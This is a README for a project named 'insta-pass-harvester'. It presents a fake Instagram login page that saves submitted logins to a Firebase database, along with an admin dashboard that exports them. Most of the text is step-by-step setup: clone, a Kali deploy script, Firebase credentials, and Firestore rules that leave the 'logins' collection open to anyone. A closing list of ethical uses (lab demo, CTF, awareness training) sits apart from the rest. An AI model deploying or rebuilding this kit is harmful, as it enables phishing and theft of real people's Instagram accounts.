# 📸 Instagram Intelligence Platform

A high-fidelity Instagram login page integrated with a real-time intelligence dashboard.  
Built with **React + TypeScript + Vite** and powered by **Firebase**.

---

## ⚡ One-Command Deploy (Kali Linux)

Clone the repo, drop in your Firebase credentials, and deploy — all in one flow:

```bash
# 1. Clone
git clone https://github.com/Abhigyan076/insta-pass-harvester.git
cd insta-pass-harvester

# 2. Make the deploy script executable
chmod +x deploy.sh

# 3. Run it — handles everything automatically
./deploy.sh
```

The script will:
- ✅ Auto-install **Node.js** (via nvm) if missing
- ✅ Auto-install **Firebase CLI** if missing
- ✅ Copy `.env.example` → `.env` and **pause for you to add credentials**
- ✅ Validate that you've filled in real credentials
- ✅ `npm install` → `npm run build` → `firebase deploy`

---

## 🔑 Firebase Credentials Setup

When prompted by the script (or manually), open `.env` and fill in your values:

```bash
nano .env
```

```env
VITE_FIREBASE_API_KEY=your_api_key_here
VITE_FIREBASE_AUTH_DOMAIN=your_project.firebaseapp.com
VITE_FIREBASE_PROJECT_ID=your_project_id
VITE_FIREBASE_STORAGE_BUCKET=your_project.firebasestorage.app
VITE_FIREBASE_MESSAGING_SENDER_ID=your_sender_id
VITE_FIREBASE_APP_ID=your_app_id
```

> 💡 Get these from [Firebase Console](https://console.firebase.google.com) → Project Settings → Your Apps → SDK Setup & Configuration.

---

## 🛠 Manual Deploy Steps

If you prefer step-by-step control:

```bash
# Install deps
npm install

# Add Firebase CLI
npm install -g firebase-tools

# Login to Firebase
firebase login

# Build
npm run build

# Deploy
firebase deploy
```

---

## 💻 Local Development

```bash
npm run dev
# App runs at http://localhost:5173
```

---

## 📁 Project Structure

```
src/
├── components/      # UI components (LoginForm, AdminPanel, etc.)
├── firebase/        # Firebase config (reads from .env)
├── styles/          # Global & component CSS
└── App.tsx          # Root component
.env.example         # Safe credential template (commit this)
.env                 # Your real credentials (NEVER commit)
deploy.sh            # Kali Linux one-shot deploy script
deploy.ps1           # Windows PowerShell deploy script
```

---

## 🔐 Admin Dashboard

- Navigate to the hosted app URL
- Login with admin credentials to access the intelligence dashboard
- Features: real-time graph, data export (TXT), record management

---

## ⚠️ Firestore Rules

Apply in **Firebase Console → Firestore Database → Rules**:

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /logins/{document=**} {
      allow read, write: if true;
    }
  }
}
```

---

## 🔒 Security Notes

- **Never commit `.env`** — it's blocked by `.gitignore`
- Only `.env.example` (placeholder values) is safe to push to GitHub
- Rotate your Firebase API key if it was ever exposed publicly

  • ✅ A local lab demo that only captures data you enter yourself, with a clear warning banner
  • ✅ A writeup/blog explaining how phishing works conceptually, for awareness
  • ✅ A CTF (Capture The Flag) challenge environment for ethical hacking practice
  • ✅ A legitimate security awareness training tool for organizations
